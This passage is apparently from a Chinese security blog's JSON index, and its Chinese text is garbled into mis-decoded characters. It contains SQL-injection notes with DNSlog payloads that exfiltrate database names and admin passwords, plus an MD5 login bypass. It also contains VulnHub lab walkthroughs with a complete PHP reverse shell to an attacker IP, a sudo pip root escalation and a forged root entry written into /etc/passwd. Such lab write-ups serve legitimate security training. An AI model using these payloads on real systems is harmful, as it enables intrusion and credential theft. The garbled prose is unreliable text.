è¯»å–æ–‡ä»¶çš„å‡½æ•°\nè¯»å–æ–‡ä»¶å¹¶è¿”å›æ–‡ä»¶å†…å®¹ä¸ºå­—ç¬¦ä¸²ã€‚\n\nè¦ä½¿ç”¨æ­¤å‡½æ•°ï¼Œæ–‡ä»¶å¿…é¡»ä½äºæœåŠ¡å™¨ä¸»æœºä¸Šï¼Œå¿…é¡»æŒ‡å®šå®Œæ•´è·¯å¾„çš„æ–‡ä»¶ï¼Œè€Œä¸”å¿…é¡»æœ‰FILEæƒé™ã€‚è¯¥æ–‡ä»¶æ‰€æœ‰å­—èŠ‚å¯è¯»ï¼Œä½†æ–‡ä»¶å†…å®¹å¿…é¡»å°äºmax_allowed_packetï¼ˆé™åˆ¶serveræ¥å—çš„æ•°æ®åŒ…å¤§å°å‡½æ•°ï¼Œé»˜è®¤1MBï¼‰ã€‚ å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨æˆ–æ— æ³•è¯»å–ï¼Œå› ä¸ºå‰é¢çš„æ¡ä»¶ä¹‹ä¸€ä¸æ»¡è¶³ï¼Œå‡½æ•°è¿”å› NULLã€‚\n\næ³¨ï¼šè¿™ä¸ªåŠŸèƒ½ä¸æ˜¯é»˜è®¤å¼€å¯çš„ï¼Œéœ€è¦åœ¨mysqlé…ç½®æ–‡ä»¶åŠ ä¸€å¥ secure_file_priv=\n\n**DNSLOGå¹³å°**:\nhttps://dns.xn--9tr.com/\n\nhttps://log.xn--9tr.com/\n\n**UNCè·¯å¾„**\nUNCè·¯å¾„é€šç”¨å‘½åè§„åˆ™ï¼Œä¹Ÿç§°é€šç”¨å‘½åè§„èŒƒã€é€šç”¨å‘½åçº¦å®šï¼Œç±»ä¼¼\\softerè¿™æ ·çš„å½¢å¼çš„ç½‘ç»œè·¯å¾„ã€‚\n\nUNCè·¯å¾„çš„ æ ¼å¼ ï¼š\\server\\sharename\\directory\\filename\n\nç­‰åŒäºSELECT LOAD_FILE('//åº“å.1806dl.dnslog.cn/abc'\n\nå»è®¿é—® åº“å.1806dl.dnslog.cn çš„æœåŠ¡å™¨ä¸‹çš„å…±äº«æ–‡ä»¶å¤¹abcã€‚\n\nç„¶å1806dl.dnslog.cnçš„å­åŸŸåçš„è§£æéƒ½æ˜¯åœ¨æŸå°æœåŠ¡å™¨ï¼Œç„¶åä»–è®°å½•ä¸‹æ¥äº†æœ‰äººè¯·æ±‚è®¿é—®äº†error.1806dl.dnslog.cnï¼Œç„¶ååœ¨DnsLogè¿™ä¸ªå¹³å°ä¸Šé¢æ˜¾ç¤ºå‡ºæ¥äº†\n\npayloadç¤ºä¾‹ï¼š\n```bash\n?id=1 and load_file(concat('//', database(),'.htleyd.dnslog.cn/abc'))\n?id=1 and load_file(concat('//', (select table_name from information_schema.tables where table_schema=database() limit 0,1 ),'.htleyd.dnslog.cn/abc'))\n?id=1 and load_file(concat('//',(select column_name from information_schema.columns where table_name=â€™adminâ€™ and table_schema=database() limit 2,1),'.htleyd.dnslog.cn/abc'))\n?id=1 and load_file(concat('//',(select password from admin limit 0,1),'.htleyd.dnslog.cn/abc'))\n```\n\n### '\".md5($pass,true).\"' ç™»å½•ç»•è¿‡\nå¾ˆå¤šç«™ç‚¹ä¸ºäº†å®‰å…¨éƒ½ä¼šåˆ©ç”¨è¿™æ ·çš„è¯­å¥ï¼š\n```bash\nSELECT * FROM users WHERE password = '.md5($password,true).';\n```\n\nmd5(string,true) å‡½æ•°åœ¨æŒ‡å®šäº†trueçš„æ—¶å€™ï¼Œæ˜¯è¿”å›çš„åŸå§‹ 16 å­—ç¬¦äºŒè¿›åˆ¶æ ¼å¼ï¼Œä¹Ÿå°±æ˜¯è¯´ä¼šè¿”å›è¿™æ ·å­çš„å­—ç¬¦ä¸²ï¼š'or'6\\xc9]\\x99\\xe9!r,\\xf9\\xedb\\x1cï¼š\n![](https://raw.githubusercontent.com/chencicici/images/main/202206241621318.png)\n\nè¿™ä¸æ˜¯æ™®é€šçš„äºŒè¿›åˆ¶å­—ç¬¦ä¸²ï¼Œè€Œæ˜¯ 'or'6\\xc9]\\x99\\xe9!r,\\xf9\\xedb\\x1c è¿™ç§ï¼Œè¿™æ ·çš„è¯å°±ä¼šå’Œå‰é¢çš„å½¢æˆé—­åˆï¼Œæ„æˆä¸‡èƒ½å¯†ç ã€‚\n```bash\nSELECT * FROM users WHERE password = ''or'6.......'\n```\nä½†æ˜¯æˆ‘ä»¬æ€è€ƒä¸€ä¸‹ä¸ºä»€ä¹ˆ 6\\xc9]\\x99\\xe9!r,\\xf9\\xedb\\x1c çš„å¸ƒå°”å€¼æ˜¯trueå‘¢ï¼Ÿ\n\nåœ¨mysqlé‡Œé¢ï¼Œåœ¨ç”¨ä½œå¸ƒå°”å‹åˆ¤æ–­æ—¶ï¼Œä»¥1å¼€å¤´çš„å­—ç¬¦ä¸²ä¼šè¢«å½“åšæ•´å‹æ•°ï¼ˆè¿™ç±»ä¼¼äºPHPçš„å¼±ç±»å‹ï¼‰ã€‚è¦æ³¨æ„çš„æ˜¯è¿™ç§æƒ…å†µæ˜¯å¿…é¡»è¦æœ‰å•å¼•å·æ‹¬èµ·æ¥çš„ï¼Œæ¯”å¦‚ password=â€˜xxxâ€™ or â€˜1xxxxxxxxxâ€™ï¼Œé‚£ä¹ˆå°±ç›¸å½“äºpassword=â€˜xxxâ€™ or 1 ï¼Œä¹Ÿå°±ç›¸å½“äº password=â€˜xxxâ€™ or trueï¼Œæ‰€ä»¥è¿”å›å€¼å°±æ˜¯trueã€‚è¿™é‡Œä¸åªæ˜¯1å¼€å¤´ï¼Œåªè¦æ˜¯æ•°å­—å¼€å¤´éƒ½æ˜¯å¯ä»¥çš„ã€‚å½“ç„¶å¦‚æœåªæœ‰æ•°å­—çš„è¯ï¼Œå°±ä¸éœ€è¦å•å¼•å·ï¼Œæ¯”å¦‚ password=â€˜xxxâ€™ or 1ï¼Œé‚£ä¹ˆè¿”å›å€¼ä¹Ÿæ˜¯ trueã€‚ï¼ˆxxxæŒ‡ä»£ä»»æ„å­—ç¬¦ï¼‰\n\næ¥ä¸‹æ¥å°±æ˜¯æ‰¾åˆ°è¿™æ ·å­çš„å­—ç¬¦ä¸²ï¼Œè¿™é‡Œç»™å‡ºä¸¤ä¸ªå§ã€‚\n\nffifdyopï¼š\n```bash\ncontent: ffifdyop\nhex: 276f722736c95d99e921722cf9ed621c\nraw: 'or'6\\xc9]\\x99\\xe9!r,\\xf9\\xedb\\x1c\nstring: 'or'6]!r,b\n```\n\n129581926211651571912466741651878684928ï¼š\n```bash\ncontent: 129581926211651571912466741651878684928\nhex: 06da5430449f8f6f23dfc1276f722738\nraw: \\x06\\xdaT0D\\x9f\\x8fo#\\xdf\\xc1'or'8\nstring: T0Do#'or'8\n```\n\nè½¬è½½è‡³  https://xz.aliyun.com/t/10594#toc-3\n","tags":["sqlæ³¨å…¥"],"categories":["ç¬”è®°"]},{"title":"vulnhub-EmpireBreakout","url":"/2022/06/22/vulnhub-breakoutæ‰“é¶/","content":"\n# ç¯å¢ƒ\nvulnhubé¡¹ç›®  https://www.vulnhub.com/entry/empire-breakout,751/\né¶æœº:172.16.17.152\næ”»å‡»æœºkali:172.16.17.140\n\n\n# ä¿¡æ¯æ”¶é›†\nä½¿ç”¨nmapå¯¹é¶æœºè¿›è¡Œæ‰«æ å¼€å¯äº†ä¸‰ä¸ªwebæœåŠ¡,å’Œ2ä¸ªsmbæœåŠ¡\n![](https://raw.githubusercontent.com/chencicici/images/main/202206221547410.png)\n\n445é«˜å±ç«¯å£,å°è¯•expæ‰“445ç«¯å£,å¤±è´¥,ç»§ç»­å¾€ä¸‹çœ‹80ç«¯å£\napache,åœ¨å‰ç«¯æºç é‡Œæ‰¾åˆ°æç¤ºå’ŒåŠ å¯†å¯†æ–‡\n![](https://raw.githubusercontent.com/chencicici/images/main/202206221606870.png)\n\næŒ¨ä¸ªå°è¯•è§£å¯†,æœ€åä¸ºBrainfuckåŠ å¯†,è§£å‡ºæ˜æ–‡ä¸º .2uqPEfj3D<P'a-3 åº”è¯¥æ˜¯æŸä¸ªè´¦å·çš„å¯†ç \n![](https://raw.githubusercontent.com/chencicici/images/main/202206221609231.png)\n\næŒ¨ä¸ªè®¿é—®10000/20000ç«¯å£,éƒ½æ˜¯ç™»å½•é¡µé¢,æ²¡æœ‰åˆ©ç”¨çš„ç‚¹\n![](https://raw.githubusercontent.com/chencicici/images/main/202206221612140.png)\n\n## smbå—…æ¢\næƒ³åˆ°smbæœåŠ¡è¿˜æ²¡æœ‰åˆ©ç”¨åˆ°,å›è¿‡å¤´ç»§ç»­çœ‹smbæœåŠ¡\nenum4linux å¯¹é¶æœºè¿›è¡Œå—…æ¢,çˆ†å‡ºäº†ä¸€ä¸ªç”¨æˆ·å cyber\n```bash\nenum.exeçš„Linuxæ›¿ä»£è½¯ä»¶ï¼Œç”¨äºæšä¸¾Windowså’ŒSambaä¸»æœºä¸­çš„æ•°æ®ã€‚\nenum4linux 172.16.17.152\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206221615489.png)\n\n\n# Exploit\n## ç™»å½•\nç™»å½•æˆåŠŸ,å‘ç°æœ‰ä¸ªåœ°æ–¹å¯ä»¥ç›´æ¥æ‰§è¡Œå‘½ä»¤\n![](https://raw.githubusercontent.com/chencicici/images/main/202206221619772.png)\n\nåå¼¹shell\n![](https://raw.githubusercontent.com/chencicici/images/main/202206221622849.png)\n![](https://raw.githubusercontent.com/chencicici/images/main/202206221622106.png)\n\n## ææƒ\n\næŸ¥çœ‹rootæƒé™æ‰§è¡Œçš„å‘½ä»¤,å’Œæ–‡ä»¶,æ²¡æœ‰sudoå‘½ä»¤,æ²¡æœ‰åˆ©ç”¨çš„ç‚¹\n![](https://raw.githubusercontent.com/chencicici/images/main/202206221627684.png)\n\næ‹¿åˆ°ç¬¬ä¸€ä¸ªflagå’Œä¸€ä¸ªrootæƒé™çš„ tarå‘½ä»¤\n![](https://raw.githubusercontent.com/chencicici/images/main/202206221630268.png)\n\næ—¢ç„¶æœ‰tar,é‚£ä¹ˆå°±è¦ç”¨åˆ°å‹ç¼© è§£å‹å»ææƒ,æœ€ååœ¨/var/backupsä¸‹ç¿»åˆ°ä¸€ä¸ªå¯†ç å¤‡ä»½æ–‡ä»¶\nå¯¹å¯†ç çš„å¤‡ä»½æ–‡ä»¶è¿›è¡Œå‹ç¼©ï¼Œç„¶åè§£å‹å³å¯ä¹ˆè®¿é—®æ‹¿åˆ°å¯†ç \n```bash\n./tar -czvf test.tar.gz /var/backups/.old_pass.bak\ntar -xzvf test.tar.gz\ncat var/backups/.old_pass.bak\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206221650882.png)\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202206221649498.png)"},{"title":"vulnhub-EmpireLupinOneæ‰“é¶","url":"/2022/06/21/vulnhub-Empireæ‰“é¶/","content":"# ç¯å¢ƒ\nvulnhubé¡¹ç›® https://www.vulnhub.com/series/empire,507/\né¶æœº:172.16.17.151\næ”»å‡»æœºkali:172.16.17.140\n\n# ä¿¡æ¯æ”¶é›†\nnmapæ‰«æç¡®å®šé¶æœºip,å†è¯¦ç»†æ‰«æ\nå¼€æ”¾äº†22å’Œ80,æ‰«å‡ºä¸€ä¸ª/~myfilesç›®å½•\n![](https://raw.githubusercontent.com/chencicici/images/main/202206211837023.png)\n\nè®¿é—®çœ‹çœ‹,æç¤º404,æš—ç¤ºæˆ‘ä»¬ç»§ç»­å°è¯•å½“å‰ç›®å½•\n![](https://raw.githubusercontent.com/chencicici/images/main/202206211838965.png)\n\n## fuzz\nwfuzzç»§ç»­æ‰«å½“å‰ç›®å½•\n```bash\nwfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://172.16.17.151/~FUZZ\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206211859278.png)\n\næç¤ºæˆ‘ä»¬icex64ç”¨æˆ·æœ‰sshç§˜é’¥,å¹¶ä½¿ç”¨fasttrackå»çˆ†ç ´\n![](https://raw.githubusercontent.com/chencicici/images/main/202206211901501.png)\n\nç»§ç»­çˆ†ç ´,æ‰«å‡ºä¸€ä¸ªæ–‡ä»¶\n```bash\nwfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404,403 -u http://172.16.17.151/~secret/.FUZZ.txt\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206211916638.png)\n\nä½†æ˜¯åº”è¯¥æ˜¯åŠ å¯†è¿‡çš„,ä¸æ˜¯sshå¯†é’¥\n![](https://raw.githubusercontent.com/chencicici/images/main/202206211917480.png)\n\næ‹¿å»è§£å¯†,æŒ¨ä¸ªå°è¯•å,ä»¥base58è§£å‡ºç§˜é’¥\n![](https://raw.githubusercontent.com/chencicici/images/main/202206211922436.png)\n\n# Exploit\n\n## çˆ†ç ´ç§˜é’¥\nä½¿ç”¨ssh2johnå°†ç§˜é’¥ç¼–è¯‘ä¸€ä¸‹,å†ä½¿ç”¨johnæš´åŠ›ç ´è§£,è§£å‡ºå¯†ç  P@55w0rd!\n```bash\nssh2john key.txt > passkey.txt\n                                                                                                                                                                                                              \njohn --wordlist=/usr/share/wordlists/fasttrack.txt passkey.txt\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206211929056.png)\n\n## å°è¯•ç™»å½•\nç›´æ¥ç™»å½•è¢«æ‹’ç»\n![](https://raw.githubusercontent.com/chencicici/images/main/202206211932835.png)\n\nåˆ©ç”¨ç§˜é’¥å†æ¬¡ç™»å½•,æ­¤å¤„è¦æ³¨æ„,å…ˆå°†ç§˜é’¥æƒé™æ”¹ä¸º 600\n![](https://raw.githubusercontent.com/chencicici/images/main/202206211938634.png)\n\n## ææƒ\nåœ¨å®¶ç›®å½•ä¸‹çœ‹åˆ°ä¸€ä¸ªuser.txt,æ‹¿åˆ°ç¬¬ä¸€ä¸ªflag\n![](https://raw.githubusercontent.com/chencicici/images/main/202206211946639.png)\n\næŸ¥çœ‹rootæƒé™è¿è¡Œçš„æ–‡ä»¶,æ²¡æœ‰å†™å…¥æƒé™,ç»§ç»­å¾€ä¸‹çœ‹\n![](https://raw.githubusercontent.com/chencicici/images/main/202206211941860.png)\n\nå‘ç°ä½¿ç”¨webbrowseråŒ…,è·Ÿè¿›çœ‹çœ‹\n![](https://raw.githubusercontent.com/chencicici/images/main/202206211952250.png)\n\næ˜¯rootæƒé™\n![](https://raw.githubusercontent.com/chencicici/images/main/202206211953957.png)\n\nå†™å…¥shell\n![](https://raw.githubusercontent.com/chencicici/images/main/202206212014187.png)\n\nè¿è¡Œheist.pyåå¼¹shell\n![](https://raw.githubusercontent.com/chencicici/images/main/202206212015303.png)\n\næŸ¥çœ‹arseneç”¨æˆ·ä¸‹ä»¥rootæƒé™è¿è¡Œçš„å‘½ä»¤æˆ–æ–‡ä»¶,å‘ç°pipä¸éœ€è¦å¯†ç å°±å¯ä»¥æ‰§è¡Œ\n![](https://raw.githubusercontent.com/chencicici/images/main/202206212016681.png)\n\ngoogle pipææƒ æ‰¾åˆ°æ–¹æ³•\n```bash\narsene@LupinOne:~$ TF=$(mktemp -d)\narsene@LupinOne:~$ echo \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\narsene@LupinOne:~$ sudo pip install $TF\n```\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202206212029257.png)","tags":["vulnhub","ssh"],"categories":["æ‰“é¶"]},{"title":"vulnhub-dc9æ‰“é¶","url":"/2022/06/18/vulnhub-dc9æ‰“é¶/","content":"\n# ç¯å¢ƒ\nvulnhubé¡¹ç›® https://www.vulnhub.com/entry/dc-9,412/\né¶æœº:172.16.17.150\næ”»å‡»æœºkali:172.16.17.140\n\n# æè¿°\n![](https://raw.githubusercontent.com/chencicici/images/main/202206181846501.png)\n\n# ä¿¡æ¯æ”¶é›†\nnmapæ‰«æé¶æœº,å­˜åœ¨22ç«¯å£,ä½†æ˜¯çŠ¶æ€ä¸ºfiltered,æ€€ç–‘è¢«knockdä¿æŠ¤\n![](https://raw.githubusercontent.com/chencicici/images/main/202206181847274.png)\n\næ‰«ç›®å½•\n![](https://raw.githubusercontent.com/chencicici/images/main/202206181900356.png)\n\nwebæŒ‡çº¹\n![](https://raw.githubusercontent.com/chencicici/images/main/202206181848261.png)\n\næŒ¨ä¸ªè®¿é—®æ‰«å‡ºæ¥çš„ç›®å½•,åœ¨è®¿é—®session.phpçš„æ—¶å€™å‘ç°å·²ç»ç™»å½•,åœ¨ä¸‹é¢æç¤ºæ–‡ä»¶ä¸å­˜åœ¨,å¯èƒ½å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´\n![](https://raw.githubusercontent.com/chencicici/images/main/202206181903758.png)\n\nçŒœä¸€ä¸‹æ¥å—å‚æ•°çš„å˜é‡å,æˆåŠŸè¯»å–\n![](https://raw.githubusercontent.com/chencicici/images/main/202206181915830.png)\n\nä¸Šé¢æ€€ç–‘sshè¢«ä¿æŠ¤,ç°åœ¨ç”¨æ–‡ä»¶åŒ…å«è¯»å–ä¸€ä¸‹\n![](https://raw.githubusercontent.com/chencicici/images/main/202206181919654.png)\n\n# Exploit\n## sqlæ³¨å…¥\næ–‡ä»¶åŒ…å«æ²¡æœ‰èƒ½ç»§ç»­åˆ©ç”¨çš„ç”µ,æŸ¥çœ‹å…¶ä»–åŠŸèƒ½ç‚¹,å‘ç°ä¸€å¤„æœç´¢æ¡†,postä¼ è¾“æ•°æ®,æœ‰æœç´¢å°±æœ‰æ•°æ®åº“äº¤äº’,æŠ“åŒ…fuzz\nå½“è¯­å¥ä¸º'or 1=1 #æ—¶,äº§ç”Ÿæ³¨å…¥,ä¸¢åˆ°sqlmapè·‘\n![](https://raw.githubusercontent.com/chencicici/images/main/202206181944447.png)\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202206181947908.png)\n\nè·‘å‡ºè´¦å·å¯†ç \n```bash\nsqlmap -r 1.txt -batch -D users -T 'UserDetails' -C 'password,username' --dump\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206181952744.png)\n\n\n## knockç¢°æ’ssh\nå®‰è£…knockd\n![](https://raw.githubusercontent.com/chencicici/images/main/202206181930687.png)\n\næ ¹æ®åˆšåˆšè¯»åˆ°çš„ç«¯å£,å»æ•²é—¨,é€†åºç«¯å£å·,å‘ç°sshå·²ç»å¯¹æˆ‘ä»¬å¼€æ”¾\n![](https://raw.githubusercontent.com/chencicici/images/main/202206181937749.png)\n\n\n\n## æ’åº“\nåˆ©ç”¨è·‘å‡ºæ¥çš„è´¦å·å¯†ç ,æ‹¿å»æ’ssh,è·‘å‡ºä¸‰ä¸ªè´¦å·\n```bash\nhydra -L user.txt -P passwords.txt 172.16.17.150 ssh\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206181959848.png)\n\nç›¸ç»§è¿›å…¥å‡ ä¸ªè´¦å·,ç¿»ç¿»ç¿»*10,æœ€ååœ¨janitoræ‰¾åˆ°ä¸€ä¸ªå¯†ç æ–‡ä»¶\n![](https://raw.githubusercontent.com/chencicici/images/main/202206182008193.png)\n\nå¤åˆ¶è¿›passwdæ–‡ä»¶ç»§ç»­çˆ†ç ´,çˆ†å‡ºä¸€ä¸ªæ–°çš„è´¦å·\n![](https://raw.githubusercontent.com/chencicici/images/main/202206182010559.png)\n\n\n##  ææƒ\nç™»å½•çœ‹çœ‹ä»¥rootæƒé™è¿è¡Œçš„æ–‡ä»¶\n![](https://raw.githubusercontent.com/chencicici/images/main/202206182014091.png)\n\nfindæŸ¥æ‰¾è·¯å¾„\n```bash\nfind / -name test.py -print 2>/dev/null\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206182016074.png)\n\nåˆ†æç¬¬ä¸€ä¸ªtest.pyæ–‡ä»¶,è¯»å–ç¬¬ä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹,æ·»åŠ åˆ°ç¬¬äºŒä¸ªæ–‡ä»¶çš„æœ«å°¾\n![](https://raw.githubusercontent.com/chencicici/images/main/202206182022009.png)\n\nç”Ÿæˆä¸€ä¸ªå¯†ç hash,è´¦å·ä¸ºdomon å¯†ç  123456\n```bash\nopenssl passwd -1 -salt demon 123456\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206182038473.png)\n\n\n\nå°†ç”Ÿæˆçš„å¯†ç hashå†™å…¥ä¸€ä¸ªæ–‡ä»¶\n```bash\necho 'demon:$1$demon$Mspg7FhbFwGLZ4T2s/qI6/:0:0:root:/bin/bash' >> /tmp/demon\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206182039239.png)\n\nå†åˆ©ç”¨testå‘½ä»¤å†™å…¥/etc/passwd\n```bash\nsudo /opt/devstuff/dist/test/test ./demon /etc/passwd\n```\n\nç™»å½•demon,æ‹¿åˆ°flag\n![](https://raw.githubusercontent.com/chencicici/images/main/202206182041961.png)\n\n","tags":["vulnhub","apache"],"categories":["æ‰“é¶"]},{"title":"vulnhub-dc8æ‰“é¶","url":"/2022/06/16/vulnhub-dc8æ‰“é¶/","content":"# ç¯å¢ƒ\nvulnhub https://www.vulnhub.com/entry/dc-8,367/\né¶æœº:172.16.17.149\næ”»å‡»æœºkali:172.16.17.140\n\n# æè¿°\n![](https://raw.githubusercontent.com/chencicici/images/main/202206171603251.png)\n\n\n# ä¿¡æ¯æ”¶é›†\nnmapæ‰«æé¶æœº\n![](https://raw.githubusercontent.com/chencicici/images/main/202206171605915.png)\n\nè®¿é—®é¦–é¡µçš„æ—¶å€™å‘ç°ä¸€å¤„urlå¸¦idå­—æ ·,æ‰“ä¸Šä¸€ä¸ªå•å¼•å·,å‘ç°æŠ¥é”™\n![](https://raw.githubusercontent.com/chencicici/images/main/202206171613764.png)\n\nå°è¯•æ³¨å…¥\n![](https://raw.githubusercontent.com/chencicici/images/main/202206171616391.png)\n\n\n\n# Exploit\n\n##sqlæ³¨å…¥\nä¸¢åˆ°sqlmapè·‘\n![](https://raw.githubusercontent.com/chencicici/images/main/202206171616126.png)\n\nè·‘å‡ºè´¦å·å¯†ç \n```bash\n%sqlmap -u http://172.16.17.149/?nid=3 -D d7db -T users --dump -C \"name,pass\"\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206171624065.png)\n\nä½†æ˜¯md5è§£ä¸å‡º,çœ‹åˆ°è´¦å·é‡Œæœ‰ä¸€ä¸ªjohn,æç¤ºæˆ‘ä»¬ä½¿ç”¨johnå·¥å…·\n![](https://raw.githubusercontent.com/chencicici/images/main/202206171641368.png)\n\nè·‘å‡ºä¸€ä¸ªå¯†ç turtle\n\nä»robots.txtçŸ¥é“åå°åœ°å€\n![](https://raw.githubusercontent.com/chencicici/images/main/202206171644855.png)\n\nå°è¯•ç™»å½•,johnç”¨æˆ·ç™»å½•æˆåŠŸ\n\n## åå¼¹shell\nä¸€ç›´ç¿»ç¿»ç¿»,åœ¨ä¸‹é¢è¿™ä¸ªurlç¿»åˆ°ä¸€ä¸ªåŠŸèƒ½ç‚¹,å¯ä»¥æ‰§è¡Œphpä»£ç \nhttp://172.16.17.149/node/3#overlay-context=user&overlay=node/3/webform/configure\n\nå†™åå¼¹shellè¯­å¥,éœ€è¦æ³¨æ„,è¦å†ä»£ç å‰é¢æ·»åŠ ä¸€äº›å­—ç¬¦ä¸²,ä¸ç„¶ä¸ä¼šè¢«æ‰§è¡Œ\n![](https://raw.githubusercontent.com/chencicici/images/main/202206171814251.png)\n\nwebshell\n```php\n\n  <?php\n  // php-reverse-shell - A Reverse Shell implementation in PHP\n  // Copyright (C) 2007 pentestmonkey@pentestmonkey.net\n\n  set_time_limit (0);\n  $VERSION = \"1.0\";\n  $ip = '172.16.17.140';  // You have changed this\n  $port = 9999;  // And this\n  $chunk_size = 1400;\n  $write_a = null;\n  $error_a = null;\n  $shell = 'uname -a; w; id; /bin/sh -i';\n  $daemon = 0;\n  $debug = 0;\n\n  //\n  // Daemonise ourself if possible to avoid zombies later\n  //\n\n  // pcntl_fork is hardly ever available, but will allow us to daemonise\n  // our php process and avoid zombies.  Worth a try...\n  if (function_exists('pcntl_fork')) {\n    // Fork and have the parent process exit\n    $pid = pcntl_fork();\n    \n    if ($pid == -1) {\n      printit(\"ERROR: Can't fork\");\n      exit(1);\n    }\n    \n    if ($pid) {\n      exit(0);  // Parent exits\n    }\n\n    // Make the current process a session leader\n    // Will only succeed if we forked\n    if (posix_setsid() == -1) {\n      printit(\"Error: Can't setsid()\");\n      exit(1);\n    }\n\n    $daemon = 1;\n  } else {\n    printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");\n  }\n\n  // Change to a safe directory\n  chdir(\"/\");\n\n  // Remove any umask we inherited\n  umask(0);\n\n  //\n  // Do the reverse shell...\n  //\n\n  // Open reverse connection\n  $sock = fsockopen($ip, $port, $errno, $errstr, 30);\n  if (!$sock) {\n    printit(\"$errstr ($errno)\");\n    exit(1);\n  }\n\n  // Spawn shell process\n  $descriptorspec = array(\n    0 => array(\"pipe\", \"r\"),  // stdin is a pipe that the child will read from\n    1 => array(\"pipe\", \"w\"),  // stdout is a pipe that the child will write to\n    2 => array(\"pipe\", \"w\")   // stderr is a pipe that the child will write to\n  );\n\n  $process = proc_open($shell, $descriptorspec, $pipes);\n\n  if (!is_resource($process)) {\n    printit(\"ERROR: Can't spawn shell\");\n    exit(1);\n  }\n\n  // Set everything to non-blocking\n  // Reason: Occsionally reads will block, even though stream_select tells us they won't\n  stream_set_blocking($pipes[0], 0);\n  stream_set_blocking($pipes[1], 0);\n  stream_set_blocking($pipes[2], 0);\n  stream_set_blocking($sock, 0);\n\n  printit(\"Successfully opened reverse shell to $ip:$port\");\n\n  while (1) {\n    // Check for end of TCP connection\n    if (feof($sock)) {\n      printit(\"ERROR: Shell connection terminated\");\n      break;\n    }\n\n    // Check for end of STDOUT\n    if (feof($pipes[1])) {\n      printit(\"ERROR: Shell process terminated\");\n      break;\n    }\n\n    // Wait until a command is end down $sock, or some\n    // command output is available on STDOUT or STDERR\n    $read_a = array($sock, $pipes[1], $pipes[2]);\n    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\n\n    // If we can read from the TCP socket, send\n    // data to process's STDIN\n    if (in_array($sock, $read_a)) {\n      if ($debug) printit(\"SOCK READ\");\n      $input = fread($sock, $chunk_size);\n      if ($debug) printit(\"SOCK: $input\");\n      fwrite($pipes[0], $input);\n    }\n\n    // If we can read from the process's STDOUT\n    // send data down tcp connection\n    if (in_array($pipes[1], $read_a)) {\n      if ($debug) printit(\"STDOUT READ\");\n      $input = fread($pipes[1], $chunk_size);\n      if ($debug) printit(\"STDOUT: $input\");\n      fwrite($sock, $input);\n    }\n\n    // If we can read from the process's STDERR\n    // send data down tcp connection\n    if (in_array($pipes[2], $read_a)) {\n      if ($debug) printit(\"STDERR READ\");\n      $input = fread($pipes[2], $chunk_size);\n      if ($debug) printit(\"STDERR: $input\");\n      fwrite($sock, $input);\n    }\n  }\n\n  fclose($sock);\n  fclose($pipes[0]);\n  fclose($pipes[1]);\n  fclose($pipes[2]);\n  proc_close($process);\n\n  // Like print, but does nothing if we've daemonised ourself\n  // (I can't figure out how to redirect STDOUT like a proper daemon)\n  function printit ($string) {\n    if (!$daemon) {\n      print \"$string\n\";\n    }\n  }\n\n  ?> \n  \n```\n\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202206171809111.png)\n\nkaliéœ€è¦æå‰ç›‘å¬,ç­‰å¾…åå¼¹shell\n![](https://raw.githubusercontent.com/chencicici/images/main/202206171816255.png)\n\n\n## ææƒ\nå®¶ç›®å½•æ²¡æœ‰ä¸œè¥¿,sudo -léœ€è¦å¯†ç ,ä½†æ˜¯å‘ç°ä¸€ä¸ªexim4å‘½ä»¤\n![](https://raw.githubusercontent.com/chencicici/images/main/202206171819787.png)\n\næŸ¥çœ‹exim4 ç‰ˆæœ¬\n```bash\ndpkg -l | grep exim\n```\n![](https://raw.githubusercontent.com/chencicici/images/main/202206171856431.png)\n\nç”¨msfæœç´¢åˆ©ç”¨,å‘ç°éœ€è¦ä¸€ä¸ªä¼šè¯\n![](https://raw.githubusercontent.com/chencicici/images/main/202206171825215.png)\n\nåˆ©ç”¨æ‹¿åˆ°çš„shell,åå¼¹ä¸€ä¸ªä¼šè¯ç»™msf\n![](https://raw.githubusercontent.com/chencicici/images/main/202206171839142.png)\n\nåˆ©ç”¨å¤±è´¥,å†æ‰¾åˆ«çš„expæ‰“,æ‰¾ææƒçš„\n![](https://raw.githubusercontent.com/chencicici/images/main/202206171842636.png)\n\nå°†å‡ ä¸ªexpæ‹·è´å‡ºæ¥,kaliç”¨pythonèµ·ä¸€ä¸ªhttpæœåŠ¡\n```bash\npython -m SimpleHTTPServer\n```\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202206171845121.png)\n\né¶æœºä¸‹è½½,æ³¨æ„è¦åˆ°tmpç›®å½•ä¸‹ \n![](https://raw.githubusercontent.com/chencicici/images/main/202206171857239.png)\n\nä½¿ç”¨exp,åœ¨/rootä¸‹æ‰¾åˆ°flag\n![](https://raw.githubusercontent.com/chencicici/images/main/202206171900511.png)\n\n\n\n\n\n","tags":["vulnhub","Drupal"],"categories":["æ‰“é¶"]},{"title":"vulnhub-dc7æ‰“é¶","url":"/2022/06/15/vulnhub-dc7æ‰“é¶/","content":"# ç¯å¢ƒ\nvulnhubé¡¹ç›® https://www.vulnhub.com/entry/dc-7,356/\né¶æœº:172.16.17.148\næ”»å‡»æœºkali:172.16.17.140\n\n# æè¿°\n![](https://raw.githubusercontent.com/chencicici/images/main/202206151948527.png)\n\n# 